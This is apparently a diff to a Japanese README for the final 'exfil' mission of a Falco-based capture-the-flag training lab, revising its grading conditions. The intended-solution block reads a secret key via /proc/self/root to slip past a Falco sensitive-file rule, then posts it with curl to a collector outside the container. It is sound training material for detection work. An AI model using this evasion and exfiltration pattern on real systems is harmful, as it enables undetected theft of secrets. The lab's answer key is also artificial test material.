@@ -1,13 +1,16 @@
 # 10 — The Final Exfil (Boss)
 
-集大成。master key を **発火させずに読み**、**箱の外の collector へ静かに
-持ち出す (exfil)**。2 つすべてを満たして solve。単に読んで exfil するだけ
-でも、禁止ルールを 1 つでも発火させていれば通らない (`requireExfil`)。
+集大成。master key を **禁止ルールを踏まずに別経路で読み**、**箱の外の
+collector へ静かに持ち出す (exfil)**。単に読んで exfil するだけでも、
+禁止ルールを 1 つでも発火させていれば通らない (`requireExfil`)。加えて、
+その「別経路での読み」を実際に使ったことを示す positive-proof ルール
+(`Nimbus Vault Master Key Read`) の発火が CLEARED の条件になっている
+(ここだけ他ミッションと逆で、発火させないと成立しない。05 と同型)。
 
 他シナリオで単体運用可能(採点は `falco-rule.yaml` 独立)、ただし 01-09 相当の
 知識を前提とする教育設計である(下記「なぜ 4-9 の知識が要るか」参照)。
 
-## 採点条件 (2 つすべて)
+## 採点条件 (3 つすべて)
 
 1. その user が collector に正しい flag (`expectedFlag` と一致) を exfil 済み
    (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)
@@ -15,6 +18,19 @@
    (7 つ) が 1 つも発火していない (時間では解除されない。発火した場合は
    Journey 画面の「このミッションをやり直す」ボタンでやり直す —
    その際 exfil 済みの証跡も無効化されるので、やり直した後は再度 exfil が必要)
+3. 読む段の positive-proof ルール `Nimbus Vault Master Key Read` が発火済み
+   (`expectedRules` + `requireExpectedRuleFire`、ADR-0032 D9(a))。別経路での
+   読みを実際に使ったことの積極証明。05 の `Shell Redirected Private Key Read`
+   と同じ仕組みで、**このルールの発火は検知ではなく正常**(参加者の Me 画面の
+   「発火させた Falco ルール」に出るが、これは禁止ルールとは別物で、むしろ
+   CLEARED の条件)。素朴な `cat /opt/nimbus/vault/master.key` は逆に禁止ルール
+   側 (`Read sensitive file untrusted`) を踏み、proof は点かない — 1 回の読みで
+   両方が鳴ることはない。
+
+> **デプロイ順序 (ADR-0032 S1 → S2)**: 条件 3 の proof ルールは platform の
+> `customRules` で配信される。platform 側が実クラスタで稼働してから app 側の
+> `requireExpectedRuleFire` を有効化すること — 逆順だと proof が永久に鳴らず
+> ミッションが softlock する(05 と同じ失敗モード)。
 
 **提出操作は不要**: 上記 2 条件を満たした時点で、バックグラウンドの
 auto-solve sweeper (5 秒間隔) が自動で CLEARED にする (`Grader.Sweep`)。
@@ -45,7 +61,9 @@ plant (initContainer) が `/opt/nimbus/vault/master.key` に flag だけを
 ## 想定解
 
 ```bash
-# 1) 発火させずに読む (Mission 03 の技法をこの vault ファイルに再利用)
+# 1) 禁止ルールを踏まずに別経路で読む (Mission 03 の技法をこの vault ファイルに再利用)
+#    → 禁止 Read sensitive file untrusted は踏まないが、技法の proof ルール
+#       Nimbus Vault Master Key Read が発火する (これが CLEARED の条件)
 FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)
 
 # 2) 既存 curl で collector へ静かに HTTP exfil
@@ -53,7 +71,8 @@ curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
   -H 'Content-Type: application/json' \
   -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
 #  → {"received":true,...}
-# 提出操作は不要 — 禁止ルールを一度も発火させていなければ数秒以内に自動で solve
+# 提出操作は不要 — proof ルールが発火済みで、禁止ルールを一度も発火させていなければ
+# 数秒以内に自動で solve (別経路での読み自体が proof を立てるので、通常は追加操作は不要)
 ```
 
 ## 解説
